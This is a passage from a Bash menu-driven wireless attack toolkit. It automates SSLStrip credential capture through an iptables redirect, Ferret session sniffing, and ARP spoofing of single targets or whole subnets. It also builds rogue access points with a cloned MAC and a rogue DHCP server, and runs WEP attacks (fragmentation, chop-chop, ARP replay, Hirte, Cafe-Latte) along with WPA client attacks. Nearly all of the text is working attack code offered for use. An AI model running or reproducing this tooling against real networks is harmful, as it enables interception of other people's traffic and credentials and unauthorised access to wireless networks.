		ferret_II--;;

		3) echo -e "\033[36m\n1) Wireless\n2) Wired"
		read var
		case $var in
			1) fer_type=Wireless
			wifi_check=x;;

			2) fer_type=Wired
			wifi_check=y;;

			*) fer_type=Wireless
			wifi_check=x;;
		esac

		ferret_II--;;

		4) atk_menu--;;

		5) main_menu--;;

		6) if [[ -z $fer_dev ]];then
			echo -e "\033[31mYou Must Choose a Device to Proceed"
			read
			ferret_II--
		else
			case $wifi_check in
				x) echo -e "\033[36m\nWireless Channel to Sniff? (1-11) {6 is null default}"
				read fer_chan
				case $fer_chan in
					1|2|3|4|5|6|7|8|9|10|11) ;;
					*) fer_chan=6 ;;
				esac

				xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev --channel $fer_chan & 
				atk_menu--;;

				y) xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev & 
				atk_menu--;;
			esac
		fi;;

		*) ferret_II--;;
	esac
	}

## Below sets my defaults, change as you wish
if [ -z $pii ];then
	fer_dev=$IE
else
	fer_dev=$pii
fi

fer_type=Wireless
wifi_check=x
ferret_II--
}

strip_em--()
{
lst_port=48450 ## Port to listen on
sstrip_log=sstrip_log ## Log Filename
log_opt="-p" ## Logging option
lck_fav=Yes ## Favicon Variable
ses_kil=Yes ## Kill Sessions Variable
ssl_tail=Yes ## SSLStrip Tail Log

	strip_em_III--()
	{
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
	if [[ $lck_fav = Yes && $ses_kil = Yes ]];then
		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port &
	elif [[ $lck_fav = Yes && $ses_kil = No ]];then
		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port &
	elif [[ $lck_fav = No && $ses_kil = Yes ]];then
		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port &
	else
		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -l $lst_port &
	fi

	sleep 2
	case $ssl_tail in
		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail" -e tail -f $sstrip_log & ;;
	esac

	atk_menu--
	}

	strip_em_II--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --SSLStrip Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Listening Port             [\033[1;33m$lst_port\033[36m]

2) Log Name                   [\033[1;33m$sstrip_log\033[36m]

3) Logging Style              [\033[1;33m$log_opt\033[36m]

4) Substituted Lock Favicon   [\033[1;33m$lck_fav\033[36m]

5) Kill Sessions in Progress  [\033[1;33m$ses_kil\033[36m]

6) Tail SSLStrip Log          [\033[1;33m$ssl_tail\033[36m]

7) Return to Previous Menu

8) Return to Main Menu

9) Proceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36m\nDefine Listening Port"
		read lst_port
		strip_em_II--;;

		2) echo -e "\033[36m\nDefine Log Name"
		read sstrip_log
		strip_em_II--;;
### Sanitize later?
		3) echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --Define Logging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Log only SSL POSTs (default)

2) Log all SSL traffic TO and FROM server

3) Log all SSL and HTTP traffic TO and FROM server\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read log_opt
		case $log_opt in
			1) log_opt="-p" ;;
			2) log_opt="-s" ;;
			3) log_opt="-a" ;;
 			*) log_opt="-p" ;;
		esac

		strip_em_II--;;

		4) lck_fav= ## Nulled
		while [ -z $lck_fav ];do
			echo -e "\033[36mFake a Favicon? (y or n)"
			read lck_fav
			case $lck_fav in
				y|Y) lck_fav=Yes ;;
				n|N) lck_fav=No ;;
				*) lck_fav= ;;
			esac
		done

		strip_em_II--;;

		5) ses_kil= ## Nulled
		while [ -z $ses_kil ];do
			echo -e "\033[36mKill Present Sessions? (y or n)"
			read ses_kil
			case $ses_kil in
				y|Y) ses_kil=Yes ;;
				n|N) ses_kil=No ;;
				*) ses_kil= ;;
			esac
		done

		strip_em_II--;;

		6) ssl_tail= ## Nulled
		while [ -z $ssl_tail= ];do
			echo -e "\033[36mCreate a Tail of the SSLStrip Log? (y or n)"
			read ssl_tail
			case $ssl_tail in
				y|Y) ssl_tail=Yes ;;
				n|N) ssl_tail=No ;;
				*) ssl_tail= ;;
			esac
		done

		strip_em_II--;;

		7) atk_menu--;;

		8) main_menu--;;

		9) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $ssl_tail ]];then
			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
			read
			strip_em_II--
		else
			strip_em_III--
		fi;;

		*) strip_em_II--;;
	esac
	}

strip_em_II--
}

arpspoof--()
{
var_II= ## Nulled
var_III= ## Nulled
echo -e "\033[36m\nDevice to Spoof with?"
read spoof_dev
echo -e "\033[36m\nDefine Gateway IP Address (To)"
read gt_way
while [[ $var_II != x ]];do
	echo -e "\033[36m\nArpSpoof Everybody on the Subnet? (y or n)"
	read var
	case $var in
		y|Y) var_II=x
		xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Subnet" -e arpspoof -i $spoof_dev $gt_way &
		atk_menu--;;

		n|N) var_II=x 
		echo -e "\033[36m\nDefine Target IP address (From)"
		read tgt_ip
		while [[ $var_III != x ]]; do
			echo -e "\033[36mTwo Way Spoof? (y or n)"
			read var
			case $var in 
				y|Y) var_III=x 
				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Gateway" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
				atk_menu--;;

				n|N) var_III=x
				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
				atk_menu--;;

				*) var_III= ;;
			esac
		done;;

		*) var_II= ;;
	esac
done
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~ routing-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
k_for--()
{
clear
echo -e "\033[1;33m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Current ip_forward status is `cat /proc/sys/net/ipv4/ip_forward`
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Turn ON Kernel Forwarding

2) Turn OFF Kernel Forwarding

3) Return to Previous Menu

4) Return to Main Menu\033[1;33m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	1) echo "1" > /proc/sys/net/ipv4/ip_forward
	k_for--;;

	2) echo "0" > /proc/sys/net/ipv4/ip_forward
	k_for--;;

	3) routing--;;

	4) main_menu--;;

	*) k_for--;;
esac
}

dhcp_pre_var--()
{
dhcp_dev=at0 ## Device to setup DHCP server on
sas=192.168.10.0 ## DHCP Subnet 
sair="192.168.10.100 192.168.10.200" ## DHCP IP range
dhcp_tail=Yes ## DHCP Tail Log
dns_cus=No
}

dhcp_svr--()
{
var= ## Nulled
dhcp_svr_stat= ## Variable for Cleanup Purposes..
DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3

	dhcp_func--()
	{

		custom_dns--()
		{
		while [ "$1" != "" ];do
			for sadns in $1;do
				echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
			done
			shift
		done
		}

	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              --DHCP Server Parameters--\033[31m

DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATEWAY IP ADDRESS\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) DHCP Server Device  [\033[1;33m$dhcp_dev\033[36m]

2) Gateway IP Address  [\033[1;33m$sapip\033[36m]

3) Subnet Mask         [\033[1;33m$sasm\033[36m]

4) Subnet              [\033[1;33m$sas\033[36m]

5) IP Range            [\033[1;33m$sair\033[36m]

6) Custom DNS Entries  [\033[1;33m$sair\033[36m]

7) Tail DHCP Log       [\033[1;33m$dhcp_tail\033[36m]

8) Proceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36m\nDHCP Server Device?"
		read dhcp_dev
		dhcp_func--;;

		2) echo -e "\033[36m\nGateway IP Address?"
		read sapip
		dhcp_func--;;

		3) echo -e "\033[36m\nSubnet Mask?"
		read sasm
		dhcp_func--;;

		4) echo -e "\033[36m\nSubnet?"
		read sas
		dhcp_func--;;

		5) echo -e "\033[36m\nIP Range?"
		read sair
		dhcp_func--;;

		6) dhcp_tail= ## Nulled
		while [ -z $dhcp_tail ];do
			echo -e "\033[36mCreate a Tail of the DHCP Log? (y or n)"
			read dhcp_tail
			case $dhcp_tail in
				y|Y) dhcp_tail=Yes ;;
				n|N) dhcp_tail=No ;;
				*) dhcp_tail= ;;
			esac
		done

		dhcp_func--;;

		7) dns_cus= ## Nulled
		while [ -z $dns_cus ];do
			echo -e "\033[36mCreate Custom DNS Entries? (y or n)"
			read dns_cus
			case $dns_cus in
				y|Y) dhcp_tail=Yes 
				echo -e "\033[1;32mEnter the desired IP Addressess of the DNS seperated by a space
i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
				read dns_entry ;;

				n|N) dns_cus=No ;;

				*) dns_cus= ;;
			esac
		done

		dhcp_func--;;

		8) if [[ -z $dhcp_dev || -z $sapip || -z $sasm || -z $sas || -z $sair || -z $dhcp_tail || -z $dns_cus ]];then
			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
			read
			dhcp_func--
		fi;;

		*) dhcp_func--;;
	esac

	## Clear any dhcp leases that might have been left behind
	echo > /var/lib/dhcp3/dhcpd.leases
	## Empty the file to start clean
	cat /dev/null > /tmp/dhcpd.conf
	## start dhcpd daemon with special configuration file
	echo -e "\033[1;33mGenerating /tmp/dhcpd.conf"
	echo "default-lease-time 60;">> /tmp/dhcpd.conf
	echo "max-lease-time 72;" >> /tmp/dhcpd.conf
	echo "ddns-update-style none;" >> /tmp/dhcpd.conf
	echo "authoritative;" >> /tmp/dhcpd.conf
	echo "log-facility local7;" >> /tmp/dhcpd.conf
	echo "subnet $sas netmask $sasm {" >> /tmp/dhcpd.conf
	echo "range $sair;" >> /tmp/dhcpd.conf
	echo "option routers $sapip;" >> /tmp/dhcpd.conf
## Old messy way of doing things
# 	for sadns in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}');do
## Cleaner way of doing things
	if [[ $dns_cus = No ]];then
		for sadns in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
			echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
		done
	else
		custom_dns-- $dns_entry
	fi

	echo "}"  >> /tmp/dhcpd.conf
	}

	dhcp_svr_II--()
	{
	echo -e "\033[1;33m"
# 	xterm -bg black -fg grey -sb -rightbar -hold -title "DHCP Server" -e dhcpd3 -cf $DHCPDCONF $dhcp_dev &
	dhcpd3 -cf $DHCPDCONF $dhcp_dev &
	dhcp_svr_stat=x
	if [ $? -ne 0 ];then
		echo -e "\033[31mThe DHCP server could not be started\nPress Enter to Return to Routing Features"
		read
		routing--
	else
		route add -net $sas netmask $sasm gw $sapip
		iptables -P FORWARD ACCEPT
		case $rte_choice in
			2) iptables -t nat -A POSTROUTING -o $IE -j MASQUERADE
			#set Blackhole Routing to bypass cached DNS entries
			iptables -t nat -A PREROUTING -i at0 -j REDIRECT;;

			4) iptables -t nat -A POSTROUTING -o $IE -j MASQUERADE;;
		esac

		case $dhcp_tail in
			Yes) xterm -bg black -fg grey -sb -rightbar -title "DHCP Server Tail" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
		esac

		echo -e "\033[1;33m\n\n\n\nDHCP server started succesfully\n\n"
		sleep 3
		echo -e "\033[1;32m\n\n\n\nPress Enter to Return to Routing Features"
		read
		routing--
	fi
	}

if [ -e $DHCPDCONF ] ; then
	while [ -z $var ];do
	echo -e "\033[31m\nDHCP Server Configuration File Exists\033[36m\n
Create New File [\033[31mDeleting /tmp/dhcpd.conf\033[36m] (y or n)?"
	read var
	case $var in
		y|Y) dhcp_func--
		dhcp_svr_II--;;

		n|N) echo > /var/lib/dhcp3/dhcpd.leases ## Clear any dhcp leases that might have been left behind
		dhcp_svr_II--;;

		*) var= ;;
	esac
	done
else
	dhcp_func--
	dhcp_svr_II--
fi
}
##-----------------------------------------------------------------------------##

##~~~~~~~~~~~~~~~~~~~~~~~ routing-- shared sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
ap_pre_var--()
{
sapip=192.168.10.1 ## SoftAP IP Address
sasm=255.255.255.0 ## SoftAP Subnet Mask
sac=6 ## SoftAP Channel
mtu_size=1500 ## MTU Size
dhcp_autol=Yes ## DHCP Autolaunch for speed and intensity purposes
ap_check=x ## Variable to make sure these pre-variables are called if DHCP server is done prior to SoftAP
}

ap_setup--()
{

	var_meth--()
	{
	clear
	BB= ## Nulled
	while [ -z $BB ];do
		echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
               --Method Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) blackhole--> Responds to All Probe Requests

2) bullzeye--> Responds only to the specified ESSID\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read BB
	done

	case $BB in
		1|2) ap--;;
		*) var_meth--;;
	esac
	}

clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        --Soft AP Parameters--\033[31m

        DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE SOFTAP IP ADDRESS\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) SoftAP Physical Device [\033[1;33m$pre_pii\033[36m] (Not The Monitor Mode Device Name)

2) SoftAP IP Address      [\033[1;33m$sapip\033[36m]

3) SoftAP Subnet Mask     [\033[1;33m$sasm\033[36m]

4) SoftAP Channel         [\033[1;33m$sac\033[36m]

5) MTU Size               [\033[1;33m$mtu_size\033[36m]

6) DHCP Server Autolaunch [\033[1;33m$dhcp_autol\033[36m]

7) Proceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
case $var in
	1) echo -e "\033[36m\nSoftAP Physical Device?"
	read pre_pii
	ap_setup--;;

	2) echo -e "\033[36m\nSoftAP IP Address?"
	read sapip
	ap_setup--;;

	3) echo -e "\033[36m\nSoftAP Subnet Mask?"
	read sasm
	ap_setup--;;

	4) echo -e "\033[36m\nSoftAP Channel?"
	read sac
	case $sac in
		1|2|3|4|5|6|7|8|9|10|11) ;;
		*) sac=6 ;;
	esac

	ap_setup--;;

	5) echo -e "\033[36mDesired MTU Size?"
	read mtu_size
	ap_setup--;;

	6) dhcp_autol= ## Nulled
	while [ -z $dhcp_autol ];do
		echo -e "\033[36mAutolaunch DHCP Server? (y or n)"
		read dhcp_autol
		case $dhcp_autol in
			y|Y) dhcp_autol=Yes ;;
			n|N) dhcp_autol=No ;;
			*) dhcp_autol= ;;
 		esac
	done

	ap_setup--;;

	7) if [[ -z $pre_pii || -z $sapip || -z $sasm || -z $sac || -z $mtu_size || -z $dhcp_autol ]];then
		echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
		read
		ap_setup--
	fi;;

	*) ap_setup--;;
esac

if [[ $private = x ]]; then
	BB=3
	ap--
else
	var_meth--
fi
}

ap--()
{
## pres_mac= ## MAC Address for the SoftAP
pres_mac=`ifconfig $pre_pii | awk '{print $5}'`
pres_mac=`echo $pres_mac | awk '{print $1}'`
## blackhole targets every single probe request on current channel
modprobe tun
if [ $BB = 1 ]; then
	xterm -bg black -fg grey -sb -rightbar -title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
	clear
## bullzeye targets specified ESSID only
elif [ $BB = 2 ]; then
	echo -e "\033[36mDesired ESSID?"
	read SSID
	xterm -bg black -fg grey -sb -rightbar -title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
	clear
elif [ $BB = 3 ];then
	private= ## Nulled
	echo -e "\033[36mDesired ESSID?"
	read SSID
	echo -e "\033[36mUse WEP? (y or n)"
	read var
	case $var in
		y|Y) echo -e "\033[36mPassword?"
		read wep_pword
		xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" -w $wep_pword $pii &
		clear;;

		n|N) xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" $pii & ;;

		*) ap--;;
	esac
fi

# give enough time before next command for interface to come up
# Intended to prevent errors on Virtual Machines with USB cards
echo -e "\033[1;33mConfiguring Devices.............."
sleep 7
## Make sure to use matching MTUs for all NICs that are a part of this script, otherwise undesired results may occur.
macchanger -m $pres_mac at0
ifconfig at0 up $sapip netmask $sasm
ifconfig $pii mtu $mtu_size
ifconfig at0 mtu $mtu_size
if [[ $dhcp_autol = Yes ]];then
	dhcp_pre_var--
	dhcp_svr--
else
	routing--
fi
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~ in-depth sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~ ipt_-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
ipt_flush--()
{
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~
  --Flush IPTABLES--
~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Filter Tables

2) NAT Tables

3) Mangle Tables

4) Raw Tables

5) Flush All 4 Tables

6) Previous Menu

7) Main Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	1) iptables -t filter --flush
	iptables-save -t filter | egrep -v "Generated by|COMMIT|Completed on"
	ipt_flush--;;

	2) iptables -t nat --flush
	iptables-save -t nat | egrep -v "Generated by|COMMIT|Completed on"
	ipt_flush--;;

	3) iptables -t mangle --flush
	iptables-save -t mangle | egrep -v "Generated by|COMMIT|Completed on"
	ipt_flush--;;

	4) iptables -t raw --flush
	iptables-save -t raw | egrep -v "Generated by|COMMIT|Completed on"
	ipt_flush--;;

	5) iptables -t filter --flush
	iptables -t nat --flush
	iptables -t mangle --flush
	iptables -t raw --flush
	iptables-save | egrep -v "Generated by|COMMIT|Completed on"
	ipt_flush--;;

	6) ipt_--;;
	
	7) main_menu--;;
	
	*) ipt_flush--;;
esac
}
##^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^##
##~~~~~~~~~~~~~~~~~~~~~~ END OF in-depth sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ BEGINNING OF wifi_101-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
wifi_101--()
{
trap cleanup_101-- INT

##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
	tchan--()
	{
	tc= ## tgt channel
	while [ -z $tc ];do
		echo -e "\033[36m\nTgt Channel?"
		read tc
	done
	}

	cfile--()
	{
	cf= ## capture file name
	while [ -z $cf ];do
		echo -e "\033[36m\nCapture File Name?"
		read cf
	done
	}

	st_1--()
	{
	clear
	echo -e "\033[1;32m\
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**********************************************************
             .....BEFORE PROCEEDING..... 
                  ...MAKE SURE...

  IF YOU ELECTED TO DO THE PRELIMINARY AIRODUMP-NG SCAN
YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION

..........UNDESIRED RESULTS MAY OCCUR OTHERWISE...........
**********************************************************

Two xterm windows are getting ready to launch:

The xterm Airodump-NG window will capture the packets you need in .cap format

The xterm Aireplay-NG window will 'Authenticate' the specified source MAC with the access point

Refer to the xterm Aireplay-NG window for VERIFICATION of fake authentication


****************************************************
Come back to THIS screen to continue with the script
****************************************************

----------------------
Press Enter to Proceed
----------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read
	kill -9 $ias_pid &
	kill -9 $dea_pid &
	sleep .7
	clear
	}

	st_2--()
	{
	echo -e "\033[1;32m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Press ENTER to begin generating weak IVs
An Aireplay-NG xterm window will then launch, and after it begins injecting packets
Refer to the xterm Airodump-NG window........

If your Aireplay-NG xterm session errored out and didn't inject packets
Proceed to the Amplification Attack Session and repeat the process

As soon as a nice flow of IVs begin, return to THIS screen
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	read
	}

	st_3--()
	{
	echo -e "\033[1;32m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
DO NOT PRESS ENTER UNTIL THE FLOW OF IVS 
BEGINS IN THE XTERM AIRODUMP-NG WINDOW!!!!!!!!!!.......

OTHERWISE AIRCRACK-NG WILL ERROR/EXIT OUT
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read
	}

	wpa_warn--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**********************************************************
             .....BEFORE PROCEEDING..... 
                  ...MAKE SURE...

  IF YOU ELECTED TO DO THE PRELIMINARY AIRODUMP-NG SCAN
YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION

..........UNDESIRED RESULTS MAY OCCUR OTHERWISE...........
**********************************************************

            ****PRESS ENTER TO CONTINUE****

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read
	kill -9 $ias_pid &
	kill -9 $dea_pid &
	sleep .7
	}

	dump--()
	{
	xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format pcap &
	}

	pforge--()
	{
	pf_var= ## variable name for -w filename
	echo -e "\033[1;33m"
	packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w arp-request
	echo -e "\033[36m\nWhat was the name of the file just created?"
	read pf_var
	}

	auth--()
	{
	var= ## Nulled
	hid_essid= ## Variable for hidden ESSID
	echo -e "\033[36m\nAre You Authenticating Against a Hidden ESSID? (y or n)"
	read var
	case $var in
		y|Y) while [ -z $hid_essid ];do 
			echo -e "\033[36m\nEnter Hidden ESSID"
			read hid_essid
		done

		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" & ;;
	
		n|N) xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm & ;;
		*) auth--;;
	esac
	}
##-----------------------------------------------------------------------------##

##~~~~~~~~~~~~~~~~~~~~~~~ Starting WIFI_101-- Function ~~~~~~~~~~~~~~~~~~~~~~~~##
	venue--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --WiFi 101 Venue Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Wireless Channel Recon

2) Router-Based WEP Attacks

3) Client-Based WEP Attacks

4) WPA Attacks (THIS DOES NOT INVOKE AIRCRACK-NG)

5) Return to Main Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) scan_var=wifi 
		sc=1-11 ## Channels to scan on
		hop=1500 ## time between channel hops
		scan--;;

		2) rtech--;;

		3) ctech--;;

		4) WPA--;;

		5) main_menu--;;

		*) venue--;;
	esac
	}
##-----------------------------------------------------------------------------##

##~~~~~~~~~~~~~~~~~~~~~~~~~~~ venue-- functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
	rtech--()
	{
	#rt= ## Router Technique
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~
Router Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Fragmentation Attack

2) Chop Attack

3) ARP Replay Attack

4) -2 Attack\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read rt
	case $rt in
		1|2|3|4) b= ## tgt bssid
		sm= ## source mac
		rd=10 ## reauthentication delay
		ppb=1 ## Re-authentication packets per burst
		kaf=3 ## keep-alive frequency
		rppb=500 ## Replayed packets per burst
		rtech_II--;;
		
		*) rtech--;;
	esac
	}

	ctech--()
	{
	#ct= ## Client technique
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~
Client Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Hirte (AP)

2) Hirte (Ad-Hoc)

3) Cafe-Latte

4) Shared-Key PRGA Capture\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read ct
	case $ct in
		1|2|3|4) ctech_II--;;
		*) ctech--;;
	esac
	}

	WPA--()
	{
	#wifu= ## WPA Client Attack Method
	e= ## Desired ESSID
	#enc_type= ## Encryption Type
	#spec= ## Variable for WPA_III()
	all_probe= ## Respond to all probes
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          --WPA Client Attack Techniques--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) WPA (Specified ESSID)

2) WPA2 (Specified ESSID)

3) All Tags (Specified ESSID)

4) WPA (Responding to All Broadcast Probes)

5) WPA2 (Responding to All Broadcast Probes)

6) All Tags (Responding to All Broadcast Probes)

7) d'Otreppe WPA (Specified ESSID)

8) d'Otreppe WPA2 (Specified ESSID)

9) d'Otreppe All Tags (Specified ESSID)\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read wifu
	case $wifu in
		1|4|7) enc_type='-z 2';;
		2|5|8) enc_type='-Z 4';;
		3|6|9) enc_type='-0';;
		*) WPA--;;
	esac

	case $wifu in
		1|2|3|7|8|9) spec=1
		while [ -z $e ];do
			echo -e "\033[36m\nDefine ESSID"
			read e
		done;;

		4|5|6) spec=2
		all_probe='-P -C 60';;

		*) WPA--;;
	esac

	WPA_II--
	}
##-----------------------------------------------------------------------------##

##~~~~~~~~~~~~~~~~~~~ rtech-- & ctech-- shared sub-functions ~~~~~~~~~~~~~~~~~~##
	crack--()
	{
	aircrack-ng -a 1 -b $b $cf-*.cap
	echo -e "\033[1;32mYour .cap file starts with ~~~> $cf"
	read
	main_menu--
	}
##-----------------------------------------------------------------------------##

##~~~~~~~~~~~~~~~~~~~~~~~~~ rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
	rtech_II--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                           --Packet Injection Parameters--
